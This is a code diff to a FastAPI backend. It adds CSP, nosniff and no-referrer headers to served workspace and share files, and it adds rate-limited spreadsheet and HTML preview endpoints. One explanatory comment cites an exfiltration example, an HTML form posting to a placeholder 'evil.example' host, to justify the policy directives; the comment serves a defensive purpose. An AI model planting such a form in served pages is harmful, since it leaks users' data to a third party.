@@ -1,17 +1,25 @@
 """REST + WebSocket API."""
 
 import asyncio
+import errno
 import json
+import mimetypes
 import re
 import shutil
 import uuid
+from collections.abc import AsyncIterator, Callable
+from concurrent.futures import ThreadPoolExecutor
+from contextlib import asynccontextmanager
+from dataclasses import dataclass, field
 from pathlib import Path
 
 from fastapi import APIRouter, Depends, File, HTTPException, UploadFile, WebSocket, WebSocketDisconnect
 from fastapi.responses import FileResponse, Response
+from loguru import logger
 from pydantic import BaseModel
 
 from claw.api.deps import AppState, current_user, current_user_ws, get_state
+from claw.api.file_preview import PreviewError, preview_html, preview_table
 from claw.db.models import User
 
 router = APIRouter()
@@ -29,10 +37,66 @@ def _shares_root(state: AppState) -> Path:
     return (state.settings.workspaces_root / "_shares").resolve()
 
 
+_NO_INDEX_HEADERS = {
+    # Referrer-Policy matters most on share responses: the capability URL is the
+    # snapshot's only credential, so it must never ride along in a Referer to a
+    # third party. Note a served page can set <meta name="referrer"
+    # content="unsafe-url"> to widen the browser default — that is markup, so
+    # script-src 'none' does not stop it; only this header does.
+    "X-Robots-Tag": "noindex, nofollow",
+    "Referrer-Policy": "no-referrer",
+}
+
+
 def _share_no_index(resp: Response) -> None:
     """Keep shared pages out of search engines and referrer chains."""
-    resp.headers["X-Robots-Tag"] = "noindex, nofollow"
-    resp.headers["Referrer-Policy"] = "no-referrer"
+    resp.headers.update(_NO_INDEX_HEADERS)
+
+
+# Both file-serving routes below return FileResponse with no filename, so the
+# browser renders html/pdf/svg/images inline rather than downloading them —
+# that's the whole point (a report the agent wrote should be viewable). But an
+# agent-authored .html or .svg file is untrusted content served from the app's
+# own origin: without a CSP, a script in that file runs with the app's cookies,
+# localStorage, and WebSocket connection, and can call back into the API
+# (stored/triggered XSS). script-src/object-src 'none' neutralizes that for
+# both a direct new-tab open and a future <iframe> embed — CSP is the
+# document's own policy, so an iframe's `sandbox` attribute cannot loosen it.
+#
+# form-action/base-uri are listed explicitly because `default-src` does NOT
+# act as a fallback for them (unlike script-src/object-src/etc.) — without
+# these, a served HTML file could still exfiltrate via a plain <form
+# action="https://evil.example"> or hijack relative links via <base>, with
+# no JavaScript involved at all, silently defeating the point of this CSP.
+_ACTIVE_CONTENT_CSP = (
+    "default-src 'none'; script-src 'none'; object-src 'none'; frame-src 'none'; "
+    "style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; "
+    "frame-ancestors 'self'; form-action 'self'; base-uri 'self'"
+)
+
+# Only these media types can execute script in a same-origin document, so only
+# they need the CSP. Applying it to everything broke real files: object-src
+# 'none' also blocks Chromium's built-in PDF viewer, which renders a top-level
+# PDF navigation through an embedded plugin document — and agent-generated PDFs
+# (reportlab/weasyprint, see claw/core/builtin_skills.py) are a live feature.
+_ACTIVE_CONTENT_TYPES = frozenset(
+    {"text/html", "application/xhtml+xml", "image/svg+xml", "text/xml", "application/xml"}
+)
+
+
+def _workspace_file_headers(path: str) -> dict[str, str]:
+    """Response headers for an inline-served workspace/share file.
+
+    nosniff is unconditional: it pins the browser to the Content-Type below,
+    which is what makes the media-type test above trustworthy — without it a
+    file could be sniffed into HTML and dodge the CSP."""
+    # Mirrors Starlette FileResponse's own content-type resolution, so this
+    # decision is made on exactly the type the browser will act on.
+    media_type = mimetypes.guess_type(path)[0] or "text/plain"
+    headers = {"X-Content-Type-Options": "nosniff"}
+    if media_type in _ACTIVE_CONTENT_TYPES:
+        headers["Content-Security-Policy"] = _ACTIVE_CONTENT_CSP
+    return headers
 
 
 def _user_workspace(state: AppState, user_id: str) -> Path:
@@ -232,10 +296,13 @@ async def delete_session(
     return {"deleted": True}
 
 
-async def _owned_session(state: AppState, user: User, session_id: str):
+async def _owned_session(state: AppState, user: User, session_id: str, headers: dict[str, str] | None = None):
+    """`headers` exists for the preview routes: their 404 has to carry the same
+    nosniff their other responses do, and the header the handler sets on the
+    injected Response is dropped when an HTTPException unwinds past it."""
     session = await state.sessions.get(session_id)
     if session is None or session.user_id != user.id:
-        raise HTTPException(status_code=404, detail="session not found")
+        raise HTTPException(status_code=404, detail="session not found", headers=headers)
     return session
 
 
@@ -253,8 +320,7 @@ async def list_messages(
     return [
         m
         for m in messages
-        if m["role"] in ("user", "assistant")
-        and (m.get("content") or (m.get("meta") or {}).get("artifacts"))
+        if m["role"] in ("user", "assistant") and (m.get("content") or (m.get("meta") or {}).get("artifacts"))
     ]
 
 
@@ -274,7 +340,258 @@ async def get_workspace_file(
     resolved = _resolve_attachment(workspace, path)
     if resolved is None:
         raise HTTPException(status_code=404, detail="file not found")
-    return FileResponse(resolved)
+    return FileResponse(resolved, headers=_workspace_file_headers(resolved))
+
+
+# Preview parsing gets its own small pool instead of asyncio's default executor.
+# The default one is shared with the agent's own file tools, knowledge ingestion
+# and outbound mail, and openpyxl must materialize sharedStrings.xml in full
+# before the first row is readable — measured, 20 concurrent previews of a 4 MB
+# workbook pushed a 2 ms read_file tool call to 72 s, for every tenant at once.
+# Two workers keep preview throughput useful while leaving that pool untouched.
+_PREVIEW_EXECUTOR = ThreadPoolExecutor(max_workers=2, thread_name_prefix="claw-preview")
+
+# Admission control on top of the pool, because a bounded pool alone only moves
+# the pile-up into its queue: one fast scroll intersects many preview cards at
+# once, and each request would then sit for minutes. Beyond this depth the
+# endpoint sheds load; the UI already falls back to a plain download chip.
+_PREVIEW_MAX_QUEUED = 8
+_PREVIEW_QUEUE_TIMEOUT = 30.0
+
+# Per-tenant share of the pool above. Without it the global gate is first-come,
+# first-served across tenants, so one user scrolling a transcript full of
+# artifacts intersects enough cards to hold all 8 slots and every other tenant's
+# preview sheds at 503. Deliberately well under _PREVIEW_MAX_QUEUED so a single
+# user can never be the reason another one is refused, and >1 so an ordinary
+# scroll still previews several cards at once.
+_PREVIEW_MAX_PER_USER = 3
+
+# Every preview error carries this too, not just the success path. FastAPI merges
+# the injected Response's headers only when the handler returns; an HTTPException
+# unwinds past that and Starlette builds a fresh JSONResponse, so the nosniff set
+# in _bounded_preview is dropped from exactly the 400/404/503 bodies that echo a
+# caller-supplied `path` or a parser's message back into JSON. Those URLs are
+# navigable (`?token=` is accepted), so a sniffed error body is the same
+# same-origin HTML hazard as a sniffed success body.
+_PREVIEW_ERROR_HEADERS = {"X-Content-Type-Options": "nosniff"}
+
+# The OSErrors that genuinely mean "this path is not a readable file" and so are
+# the caller's 400. Everything else an open()/read() can raise is about the host,
+# not the artifact, and belongs in the 5xx rate. ENOENT is absent because
+# FileNotFoundError is handled on its own arm, as a 404.
+_PREVIEW_UNREADABLE_ERRNOS = frozenset(
+    {errno.EISDIR, errno.EACCES, errno.EPERM, errno.ENOTDIR, errno.ELOOP, errno.ENAMETOOLONG}
+)
+
+
+@dataclass
+class _PreviewGate:
+    """Admission state, rebuilt whenever the running loop changes.
+
+    A module-level Semaphore would be simpler, but asyncio binds one to the
+    first loop that ever *blocks* on it and raises for any other — and the
+    uncontended fast path never binds, so the mismatch only appears under the
+    load this is here to handle. Serving is single-loop, so this rebinds at most
+    once there; per-loop is what keeps it honest under test.
+    """
+
+    loop: asyncio.AbstractEventLoop
+    overall: asyncio.Semaphore
+    # Per-user semaphores are created on demand and dropped again as soon as a
+    # user has no preview in flight, so this dict is bounded by *concurrent*
+    # previewers rather than growing once per user id ever seen.
+    per_user: dict[str, tuple[asyncio.Semaphore, list[int]]] = field(default_factory=dict)
+
+
+_preview_gate: _PreviewGate | None = None
+
+
+def _preview_admission() -> _PreviewGate:
+    global _preview_gate
+    loop = asyncio.get_running_loop()
+    if _preview_gate is None or _preview_gate.loop is not loop:
+        _preview_gate = _PreviewGate(loop, asyncio.Semaphore(_PREVIEW_MAX_QUEUED))
+    return _preview_gate
+
+
+@asynccontextmanager
+async def _preview_slot(user_id: str) -> AsyncIterator[None]:
+    """Hold one per-user slot and one global slot, or shed with 503.
+
+    Both waits share a single deadline: acquiring them in sequence with a
+    _PREVIEW_QUEUE_TIMEOUT each would let a request sit for twice as long as the
+    timeout claims, which is the opposite of what shedding is for.
+    """
+    gate = _preview_admission()
+    entry = gate.per_user.get(user_id)
+    if entry is None:
+        entry = (asyncio.Semaphore(_PREVIEW_MAX_PER_USER), [0])
+        gate.per_user[user_id] = entry
+    mine, refs = entry
+    refs[0] += 1
+    deadline = gate.loop.time() + _PREVIEW_QUEUE_TIMEOUT
+    try:
+        await _acquire_by(mine, deadline)
+        try:
+            await _acquire_by(gate.overall, deadline)
+            try:
+                yield
+            finally:
+                gate.overall.release()
+        finally:
+            mine.release()
+    finally:
+        refs[0] -= 1
+        if refs[0] == 0:
+            # Only safe because nothing above awaits between this check and the
+            # pop: a newly arriving request for the same user would otherwise
+            # take the entry we are about to discard and lose its slot count.
+            gate.per_user.pop(user_id, None)
+
+
+def _preview_busy() -> HTTPException:
+    return HTTPException(
+        status_code=503,
+        detail="preview is busy, try again shortly",
+        headers={"Retry-After": "5", **_PREVIEW_ERROR_HEADERS},
+    )
+
+
+async def _acquire_by(sem: asyncio.Semaphore, deadline: float) -> None:
+    """Take a permit from `sem`, or shed once the shared deadline has passed.
+
+    The free-permit case is handled before the clock is consulted at all.
+    Deferring to wait_for here instead would shed while capacity sits idle:
+    `wait_for` with a non-positive timeout raises without ever polling the
+    awaitable, and a non-positive remainder is the normal state of the second
+    acquire once the first one has used up the budget. Semaphore.acquire()
+    completes without suspending when it is not locked, so this cannot block,
+    and `locked()` counts existing waiters too — a free permit is never taken
+    ahead of someone already queued for it.
+    """
+    if not sem.locked():
+        await sem.acquire()
+        return
+    remaining = deadline - asyncio.get_running_loop().time()
+    if remaining <= 0:
+        raise _preview_busy()
+    try:
+        await asyncio.wait_for(sem.acquire(), timeout=remaining)
+    except TimeoutError:
+        raise _preview_busy() from None
+
+
+async def _bounded_preview(
+    state: AppState,
+    user: User,
+    session_id: str,
+    path: str,
+    parse: Callable[[str], dict],
+    response: Response,
+) -> dict:
+    """Ownership check, path resolution, load shedding and error mapping, shared
+    by every preview kind — so adding a kind can't quietly skip the admission
+    control that keeps one fast scroll from queueing minutes of work.
+
+    `parse` runs on _PREVIEW_EXECUTOR even when it is only a bounded read: the
+    point of that pool is that preview work of any kind never lands on the
+    executor the agent's own file tools share.
+    """
+    # These responses embed agent-authored markup in their JSON body, and
+    # current_user accepts a `?token=` query param, so the URL is navigable as a
+    # top-level document. nosniff is what pins the browser to application/json
+    # and stops that body being sniffed into an executable same-origin HTML
+    # document — the same reason _workspace_file_headers sets it unconditionally.
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    await _owned_session(state, user, session_id, _PREVIEW_ERROR_HEADERS)
+    workspace = _user_workspace(state, user.id)
+    resolved = _resolve_attachment(workspace, path)
+    if resolved is None:
+        raise HTTPException(status_code=404, detail="file not found", headers=_PREVIEW_ERROR_HEADERS)
+    async with _preview_slot(user.id):
+        return await _run_preview(parse, resolved, path)
+
+
+async def _run_preview(parse: Callable[[str], dict], resolved: str, path: str) -> dict:
+    """Run one bounded parse on the preview pool and map its failures to statuses.
+    Callers must already hold a slot from _preview_slot."""
+    try:
+        loop = asyncio.get_running_loop()
+        return await loop.run_in_executor(_PREVIEW_EXECUTOR, parse, resolved)
+    except PreviewError as exc:
+        # claw.api.file_preview converts every malformed-file case it knows
+        # about (corrupt zip, bad DEFLATE stream, openpyxl structural errors,
+        # csv.Error) into this at the source. Anything else propagates as a
+        # genuine 500 instead of being caught here and misreported as the
+        # caller's problem — that used to hide real bugs in a 400 rate that
+        # looks identical to users previewing junk files.
+        logger.info("file preview failed for {}: {}", path, exc)
+        raise HTTPException(status_code=400, detail=str(exc), headers=_PREVIEW_ERROR_HEADERS) from exc
+    except FileNotFoundError:
+        # _resolve_attachment only checked the file existed; the actual open()
+        # happens later, after queuing for a slot and a thread-pool hop — a
+        # real window for the file to be deleted/replaced concurrently.
+        raise HTTPException(
+            status_code=404, detail="file not found", headers=_PREVIEW_ERROR_HEADERS
+        ) from None
+    except OSError as exc:
+        # Same race, other outcomes: the path can come back as a directory
+        # (IsADirectoryError) or become unreadable (PermissionError — the sandbox
+        # writes into this workspace as root over a bind-mount). Neither derives
+        # from FileNotFoundError, so without this they surfaced as a 500 for what
+        # is really an unreadable file. Logged at warning because, unlike a
+        # malformed file, this points at the filesystem rather than the upload.
+        #
+        # Only those errnos. OSError also covers host-level exhaustion — ENFILE
+        # and EMFILE from a leaked descriptor, ENOSPC, EIO from failing storage —
+        # which is the server's fault, not this file's. Reporting those as 400
+        # told the client the artifact is permanently unreadable, so the UI
+        # latched its terminal chip fallback and no retry policy applied, while
+        # the incident stayed invisible in the 5xx rate. Let them reach the 500.
+        if exc.errno not in _PREVIEW_UNREADABLE_ERRNOS:
+            raise
+        logger.warning("file preview could not read {}: {}", path, exc)
+        raise HTTPException(
+            status_code=400, detail="file could not be read", headers=_PREVIEW_ERROR_HEADERS
+        ) from exc
+
+
+@router.get("/api/sessions/{session_id}/file-preview")
+async def get_workspace_file_preview(
+    session_id: str,
+    path: str,
+    response: Response,
+    user: User = Depends(current_user),
+    state: AppState = Depends(get_state),
+) -> dict:
+    """Bounded table preview of a CSV/TSV/XLSX artifact, so the chat can render
+    a spreadsheet inline instead of only offering a download. Parsing is capped
+    server-side (see claw.api.file_preview) — the browser never receives the
+    whole file, however large it is. `path` is a query param, not a path segment,
+    because the sibling /files/{path:path} route would otherwise swallow it."""
+    return await _bounded_preview(state, user, session_id, path, preview_table, response)
+
+
+@router.get("/api/sessions/{session_id}/file-preview/html")
+async def get_workspace_html_preview(
+    session_id: str,
+    path: str,
+    response: Response,
+    user: User = Depends(current_user),
+    state: AppState = Depends(get_state),
+) -> dict:
+    """Bounded source of an .html/.htm artifact for the chat's inline render.
+
+    The markup comes back as a JSON string rather than being served as text/html
+    on purpose: served as a document it would render same-origin, so the only
+    thing that renders it is the iframe the UI puts it in. Three layers keep that
+    honest — nosniff above (this URL *is* navigable, `?token=` is accepted), the
+    iframe's bare `sandbox` (opaque origin, no scripts, no forms), and the CSP
+    claw.api.file_preview injects into the markup itself, which is what denies it
+    the network. The sibling /files route serves the real file for download,
+    where _ACTIVE_CONTENT_CSP contains it instead.
+    """
+    return await _bounded_preview(state, user, session_id, path, preview_html, response)
 
 
 # --- Public share links -------------------------------------------------------
@@ -398,7 +715,11 @@ async def read_share_file(
         raise HTTPException(status_code=404, detail="file not found")
     if not resolved.is_file():
         raise HTTPException(status_code=404, detail="file not found")
-    return FileResponse(resolved)
+    # _share_no_index(response) above is a no-op for this endpoint: FastAPI only
+    # merges the injected Response's headers when the handler returns a
+    # non-Response value, and this one returns a FileResponse. Carry them
+    # explicitly or the share token leaks via Referer and the file is indexable.
+    return FileResponse(resolved, headers={**_workspace_file_headers(str(resolved)), **_NO_INDEX_HEADERS})
 
 
 @router.post("/api/sessions/{session_id}/attachments")
@@ -721,6 +1042,7 @@ async def chat_ws(websocket: WebSocket, session_id: str) -> None:
             # full traceback inside handle_message; retrieving it here only
             # prevents asyncio's "exception was never retrieved" warning.
             pass
+
     try:
         while True:
             raw = await websocket.receive_text()
@@ -740,7 +1062,9 @@ async def chat_ws(websocket: WebSocket, session_id: str) -> None:
             permission_mode = "ask" if str(payload.get("permission_mode") or "") == "ask" else "auto"
             workspace = _user_workspace(state, user.id)
             media = [
-                p for p in (_resolve_attachment(workspace, str(a)) for a in raw_attachments[:_MAX_ATTACHMENTS]) if p
+                p
+                for p in (_resolve_attachment(workspace, str(a)) for a in raw_attachments[:_MAX_ATTACHMENTS])
+                if p
             ]
             if not content and not media:
                 continue
